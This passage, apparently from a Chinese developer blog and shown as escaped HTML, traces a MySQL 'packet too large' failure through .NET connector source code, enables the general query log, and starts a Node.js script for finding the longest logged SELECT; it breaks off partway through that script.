&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;SendPacket&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;MySqlPacket packet&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[] buffer = packet.Buffer;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; length = packet.Position - &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((&lt;span class=&quot;keyword&quot;&gt;ulong&lt;/span&gt;)length &amp;gt; maxPacketSize)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; MySqlException(Resources.QueryTooLarge (&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;)MySqlErrorCode.PacketTooLarge);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; offset = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (length &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; lenToSend = length &amp;gt; maxBlockSize ? maxBlockSize : length;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        buffer[offset] = (&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;)(lenToSend &amp;amp; &lt;span class=&quot;number&quot;&gt;0xff&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        buffer[offset + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] = (&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;)((lenToSend &amp;gt;&amp;gt; &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;) &amp;amp; &lt;span class=&quot;number&quot;&gt;0xff&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        buffer[offset + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;] = (&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;)((lenToSend &amp;gt;&amp;gt; &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;) &amp;amp; &lt;span class=&quot;number&quot;&gt;0xff&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        buffer[offset + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;] = sequenceByte++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        outStream.Write(buffer, offset, lenToSend + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        outStream.Flush();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        length -= lenToSend;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        offset += lenToSend;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;查找maxPacketSize的来源&lt;br&gt;Driver.cs&lt;br&gt;&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Configure&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;MySqlConnection connection&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;bool&lt;/span&gt; firstConfigure = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// if we have not already configured our server variables&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// then do so now&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (serverProps == &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    firstConfigure = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// if we are in a pool and the user has said it&#39;s ok to cache the&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// properties, then grab it from the pool&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (Pool != &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; Settings.CacheServerProperties)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (Pool.ServerProperties == &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          Pool.ServerProperties = LoadServerProperties(connection);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            serverProps = Pool.ServerProperties;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            serverProps = LoadServerProperties(connection);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        LoadCharacterSets(connection);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt; (MySqlException ex)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// expired password capability&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ex.Number == &lt;span class=&quot;number&quot;&gt;1820&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            IsPasswordExpired = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	.......&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (serverProps.ContainsKey(&lt;span class=&quot;string&quot;&gt;&quot;max_allowed_packet&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	    maxPacketSize = Convert.ToInt64(serverProps[&lt;span class=&quot;string&quot;&gt;&quot;max_allowed_packet&quot;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	.......&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;继续查找LoadServerProperties，仍在Driver.cs中&lt;/p&gt;
&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; Dictionary&amp;lt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;,&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;&amp;gt; LoadServerProperties(MySqlConnection connection)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// load server properties&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Dictionary&amp;lt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;&amp;gt; hash = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Dictionary&amp;lt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MySqlCommand cmd = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; MySqlCommand(&lt;span class=&quot;string&quot;&gt;&quot;SHOW VARIABLES&quot;&lt;/span&gt;, connection);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;using&lt;/span&gt; (MySqlDataReader reader = cmd.ExecuteReader())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (reader.Read())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; key = reader.GetString(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt; = reader.GetString(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                hash[key] = &lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// Get time zone offset as numerical value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        timeZoneOffset = GetTimeZoneOffset(connection);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; hash;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt; (Exception ex)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        MySqlTrace.LogError(ThreadID, ex.Message);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;客户端的max_allowed_packet也是从服务器获取下来的.&lt;br&gt;所以就没办法解释这个问题，查找mysql错误日志，没有任何错误信息。最后只好把mysql普通日志打开。&lt;br&gt;set global general_log = on&lt;/p&gt;
&lt;p&gt;当天傍晚服务器依就挂掉，整个网站的所有页面无法访问数据库.sql日志100多m，非常不便于查看，用nodejs写了一个查找最长sql语句的方法.&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var fs = require(&amp;apos;fs&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var str = &amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fs.readFile(&amp;apos;mysql.log&amp;apos;, &amp;apos;utf8&amp;apos;, function (err, data) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (err) throw err;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    str = data;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    searchkey = &amp;apos;Query SELECT&amp;apos;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var pos = str.indexOf(searchkey);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var arr=new Array();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    arr[0] = pos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var k = 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var count = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    while (pos !== -1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        count++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        pos = str.indexOf(searchkey, pos + 1);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        arr[k] = pos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        k++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var max =0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var maxindex = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    for (var i=0;i&amp;lt;arr.length-2;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        var temp = arr[i+1] -arr[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if (temp&amp;gt;max)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            max = temp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            maxindex =i;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    